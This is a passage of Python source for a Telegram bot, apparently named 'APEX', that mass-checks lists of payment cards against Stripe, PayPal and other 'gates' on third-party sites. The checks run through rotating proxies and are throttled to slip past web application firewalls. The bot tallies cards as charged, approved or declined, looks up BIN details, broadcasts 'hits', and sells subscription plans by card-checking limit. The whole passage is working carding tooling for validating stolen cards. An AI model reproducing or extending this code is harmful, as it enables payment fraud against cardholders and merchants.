        await styled_reply(update, f"<blockquote><b>✅ 𝐈𝐧𝐣𝐞𝐜𝐭𝐞𝐝 <code>{len(parsed[:100])}</code> 𝐏𝐫𝐨𝐱𝐢𝐞𝐬</b></blockquote>")

    elif cmd == "proxy":
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"<blockquote><b>🔴 𝐏𝐫𝐨𝐱𝐲 𝐅𝐢𝐫𝐞𝐰𝐚𝐥𝐥 𝐄𝐦𝐩𝐭𝐲</b></blockquote>")
        t = f"<blockquote><b>⚙️ 𝐏𝐫𝐨𝐱𝐲 𝐅𝐢𝐫𝐞𝐰𝐚𝐥𝐥 ({len(proxies)}/100)</b></blockquote>\n\n"
        for i, p in enumerate(proxies[:30], 1): t += f"<code>{i}.</code> <code>{p['proxy_url']}</code>\n"
        await styled_reply(update, t)

    elif cmd == "rmpxy":
        if args and args[0].strip().lower() == 'all':
            c = await clear_all_proxies(uid)
            return await styled_reply(update, f"<blockquote><b>✅ 𝐅𝐥𝐮𝐬𝐡𝐞𝐝 <code>{c}</code> 𝐏𝐫𝐨𝐱𝐢𝐞𝐬</b></blockquote>")
        await styled_reply(update, f"<blockquote><b>🔴 𝐄𝐱𝐞𝐜𝐮𝐭𝐞 /𝐫𝐦𝐩𝐱𝐲 𝐚𝐥𝐥</b></blockquote>")

    elif cmd == "gen" and uid in ADMIN_ID:
        pk = args[0].lower() if args else "plan1"
        amt = int(args[1]) if len(args) > 1 else 1
        if pk not in PLANS: return
        kdb = await load_keys()
        gc = [f"APEX-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))}" for _ in range(amt)]
        for c in gc: kdb[c] = {"tier": PLANS[pk]["tier"], "days": PLANS[pk]["duration_days"], "used": False, "used_by": None, "generated_at": str(datetime.now())}
        await save_keys(kdb)
        t = f"<blockquote><b>✅ 𝐃𝐞𝐩𝐥𝐨𝐲𝐞𝐝 <code>{amt}</code> 𝐀𝐜𝐜𝐞𝐬𝐬 𝐊𝐞𝐲𝐬</b></blockquote>\n\n" + "\n".join([f"<code>{c}</code>" for c in gc])
        await styled_reply(update, t)

    elif cmd == "redeem":
        c = args[0].strip() if args else ""
        kdb = await load_keys()
        if c not in kdb or kdb[c]["used"]: return await styled_reply(update, f"<blockquote><b>🔴 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐂𝐨𝐫𝐫𝐮𝐩𝐭𝐞𝐝 𝐊𝐞𝐲</b></blockquote>")
        
        t, d = kdb[c]["tier"], kdb[c]["days"]
        await set_user_plan(uid, t, d)
        kdb[c]["used"], kdb[c]["used_by"] = True, uid
        await save_keys(kdb)
        
        ed = (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d')
        msg = f"<blockquote><b>🌟 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐫𝐚𝐧𝐭𝐞𝐝</b></blockquote>\n\n<b>[+] 𝐓𝐢𝐞𝐫:</b> <code>{t}</code>\n<b>[+] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> <code>{d} Days</code>\n<b>[+] 𝐓𝐞𝐫𝐦𝐢𝐧𝐚𝐭𝐢𝐨𝐧:</b> <code>{ed}</code>"
        await styled_reply(update, msg)

async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; uid = q.from_user.id
    gn = q.data.split(":")[1]
    await q.answer()
    msg_obj = q.message
    if gn == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(msg_obj, f"<blockquote><b>🔴 𝐃𝐞𝐩𝐥𝐨𝐲𝐦𝐞𝐧𝐭 𝐀𝐛𝐨𝐫𝐭𝐞𝐝</b></blockquote>")
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await q.answer("Session expired.", show_alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
    
    await styled_edit(msg_obj, f"<blockquote><b>⚙️ 𝐈𝐧𝐢𝐭𝐢𝐚𝐥𝐢𝐳𝐢𝐧𝐠 𝐀𝐩𝐞𝐱 𝐄𝐧𝐠𝐢𝐧𝐞...</b></blockquote>\n<b>[+] 𝐓𝐚𝐫𝐠𝐞𝐭:</b> <code>{gn}</code>")
    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))

async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    uid = update.effective_user.id
    tot = len(cards); chk = chg = app = ins = dec = err = 0
    st = time.time()
    sites = await get_github_sites()
    proxies = [p['proxy_url'] for p in await get_all_user_proxies(uid)] if await get_all_user_proxies(uid) else []
    http_session = await get_user_http_session(uid)
    last_resp = "Awaiting Target..."
    
    # 🛑 THE FIX: Force strict sequential execution for Stripe/PayPal to avoid WP WAF Collisions
    concurrency = 2 if gate_name in ["Stripe", "PayPal"] else WORKERS
    sem = asyncio.Semaphore(concurrency)

    async def dashboard_updater():
        while not process_store.get(uid, {}).get("stopped", False):
            await asyncio.sleep(2.5)
            if process_store.get(uid, {}).get("stopped", False): break
            el = int(time.time() - st)
            
            dt = f"""<blockquote><b>🌟 𝐀𝐏𝐄𝐗 𝐋𝐈𝐕𝐄 𝐓𝐄𝐑𝐌𝐈𝐍𝐀𝐋 🌟</b></blockquote>

<b>[🚀] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➔ <code>{gate_name}</code>
<b>[🔥] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➔ <code>{last_resp}</code>
<b>[⏱] 𝐔𝐩𝐭𝐢𝐦𝐞</b> ➔ <code>{el//3600}h {(el%3600)//60}m {el%60}s</code>"""
            
            kb = [
                [InlineKeyboardButton(f"📄 {chk}/{tot}", callback_data="none", style="success")],
                [InlineKeyboardButton(f"🟢 Charged: {chg}", callback_data="none", style="success"), InlineKeyboardButton(f"✅ Approved: {app}", callback_data="none", style="success")],
                [InlineKeyboardButton(f"🟡 Insuff: {ins}", callback_data="none", style="success"), InlineKeyboardButton(f"🔴 Declined: {dec}", callback_data="none", style="danger")],
                [InlineKeyboardButton(f"🛑 ABORT EXECUTION", callback_data=f"{stop_prefix}:{uid}", style="danger")]
            ]
            try: await styled_edit(msg_obj, dt, buttons=kb)
            except: pass

    ut = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    async def worker():
        nonlocal chk, chg, app, ins, dec, err, last_resp
        while not queue.empty() and not process_store.get(uid, {}).get("stopped", False):
            card = queue.get_nowait()
            async with sem:
                c_st = time.time()
                try:
                    p = random.choice(proxies) if proxies else None
                    if gate_name == "Stripe": res = await check_card_with_retry(card, sites, proxies, http_session, "Stripe")
                    elif gate_name == "PayPal": res = await check_card_with_retry(card, sites, proxies, http_session, "PayPal")
                    else: res = await check_card_with_retry(card, sites, proxies, http_session, gate_name)
                    
                    status = res.get('status', 'Dead')
                    chk += 1
                    raw_msg = str(res.get('message', status)).strip()
                    last_resp = raw_msg[:25] + '..' if len(raw_msg) > 25 else raw_msg
                    
                    if status == 'Charged': chg += 1
                    elif status == 'Approved': app += 1
                    elif status == 'Insufficient': ins += 1
                    else: dec += 1
                    
                    if status in ['Charged', 'Approved', 'Insufficient']:
                        c_el = time.time() - c_st
                        bi = await get_bin_info(card.split("|")[0])
                        msg = format_card_result(status, card, gate_name, res.get('message', ''), bi, c_el)
                        asyncio.create_task(styled_send(bot, uid, msg))
                        asyncio.create_task(_send_global_hit(status, gate_name, res.get('message', ''), uid, bot, c_el))
                except: dec += 1; chk += 1
                finally:
                    queue.task_done()

    wt = [asyncio.create_task(worker()) for _ in range(concurrency)]
    process_store[uid]["tasks"] = wt + [ut]
    await asyncio.gather(*wt, return_exceptions=True)
    if not ut.done(): ut.cancel()
        
    el = int(time.time() - st)
    
    ft = f"<blockquote><b>✅ 𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍 𝐓𝐄𝐑𝐌𝐈𝐍𝐀𝐓𝐄𝐃</b></blockquote>\n\n<b>[🚀] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> <code>{gate_name}</code>\n<b>[⏱] 𝐓𝐨𝐭𝐚𝐥 𝐓𝐢𝐦𝐞:</b> <code>{el//3600}h {(el%3600)//60}m {el%60}s</code>"
    fkb = [
        [InlineKeyboardButton(f"🟢 Charged: {chg}", callback_data="none", style="success"), InlineKeyboardButton(f"✅ Approved: {app}", callback_data="none", style="success")],
        [InlineKeyboardButton(f"🟡 Insuff: {ins}", callback_data="none", style="success"), InlineKeyboardButton(f"🔴 Declined: {dec}", callback_data="none", style="danger")]
    ]
    await styled_edit(msg_obj, ft, buttons=fkb)
    process_store.pop(uid, None)

async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; puid = int(q.data.split(":")[1])
    if q.from_user.id != puid and q.from_user.id not in ADMIN_ID: return
    if proc := ACTIVE_MTXT_PROCESSES.get(puid):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await q.answer("Engine Stopped!", show_alert=True)

async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; uid = q.from_user.id
    cp = await get_user_plan(uid)
    t = f"<blockquote><b>🌟 𝐕𝐈𝐏 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐏𝐥𝐚𝐧𝐬</b></blockquote>\n\n"
    for _, pi in PLANS.items():
        t += f"├ <b>{pi['name']}</b>\n│ ├ <b>Duration:</b> <code>{pi['duration_days']} Days</code>\n│ ├ <b>Limit:</b> <code>{get_cc_limit(pi['tier'])} CCs</code>\n│ ╰ <b>Price:</b> <code>{pi['price']}</code>\n│\n"
    t += f"╰ <b>Active Plan:</b> <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton("Back", callback_data="back_start", style="danger")]]
    await styled_edit(q.message, t, buttons=kb)

async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; uid = q.from_user.id
    plan = await get_user_plan(uid); limit = get_cc_limit(plan, uid)
    await send_welcome_menu(q.message, uid, plan, limit)
    await q.answer()

async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; uid = q.from_user.id
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        _JOIN_CACHE[uid] = time.time(); await q.answer("Verified!", show_alert=True)
        try: await q.message.delete()
        except: pass
        plan = await get_user_plan(uid); limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
    else: await q.answer("Not joined yet!", show_alert=True)

async def post_init(app: Application):
    try: await app.bot.delete_webhook(drop_pending_updates=True)
    except: pass
    try: await init_db()
    except: pass

def main():
    app = Application.builder().token(BOT_TOKEN).read_timeout(60).write_timeout(60).connect_timeout(60).post_init(post_init).build()
    app.add_handler(MessageHandler(filters.ALL, master_router))
    app.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
    app.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
    app.add_handler(CallbackQueryHandler(plans_cb, pattern=r"^show_plans$"))
    app.add_handler(CallbackQueryHandler(back_start_cb, pattern=r"^back_start$"))
    app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
    app.add_handler(CallbackQueryHandler(lambda u,c: u.callback_query.answer(), pattern=r"^none$"))
    logger.info("✅ APEX ENTERPRISE V3 DEPLOYED SUCCESSFULLY.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__": main()
